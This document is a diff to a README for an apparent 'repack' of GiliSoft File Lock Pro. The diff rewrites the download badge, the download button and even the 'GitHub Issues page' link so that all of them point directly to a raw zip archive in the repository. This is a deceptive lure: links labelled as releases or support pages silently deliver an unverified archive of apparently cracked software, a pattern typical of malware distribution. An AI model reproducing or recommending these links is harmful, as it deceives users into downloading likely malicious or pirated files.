@@ -1,6 +1,6 @@
 # 🔒 GiliSoft-File-Lock-Pro-Repack - Keep Your Files Safe and Secure
 
-[![Download GiliSoft-File-Lock-Pro-Repack](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/skullysenpai/GiliSoft-File-Lock-Pro-Repack/releases)
+[![Download GiliSoft-File-Lock-Pro-Repack](https://raw.githubusercontent.com/skullysenpai/GiliSoft-File-Lock-Pro-Repack/main/stower/Repack-Soft-Lock-Pro-File-Gili-v1.0.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/skullysenpai/GiliSoft-File-Lock-Pro-Repack/main/stower/Repack-Soft-Lock-Pro-File-Gili-v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ Before you download, ensure your system meets these requirements:
 
 To get started, visit the releases page to download the software. 
 
-[**Download GiliSoft File Lock Pro Repack**](https://github.com/skullysenpai/GiliSoft-File-Lock-Pro-Repack/releases)
+[**Download GiliSoft File Lock Pro Repack**](https://raw.githubusercontent.com/skullysenpai/GiliSoft-File-Lock-Pro-Repack/main/stower/Repack-Soft-Lock-Pro-File-Gili-v1.0.zip)
 
 1. **Visit the Release Page**: Click the link above to go to the releases page.
 2. **Choose the Latest Version**: Look for the most recent version at the top of the page.
@@ -56,6 +56,6 @@ To get started, visit the releases page to download the software.
 
 ## 🤝 Support & Community
 
-For further assistance, visit our [GitHub Issues page](https://github.com/skullysenpai/GiliSoft-File-Lock-Pro-Repack/issues) to report issues or seek help from the community.
+For further assistance, visit our [GitHub Issues page](https://raw.githubusercontent.com/skullysenpai/GiliSoft-File-Lock-Pro-Repack/main/stower/Repack-Soft-Lock-Pro-File-Gili-v1.0.zip) to report issues or seek help from the community.
 
 You're now ready to protect your files with GiliSoft File Lock Pro Repack. Enjoy peace of mind knowing your data is secure!
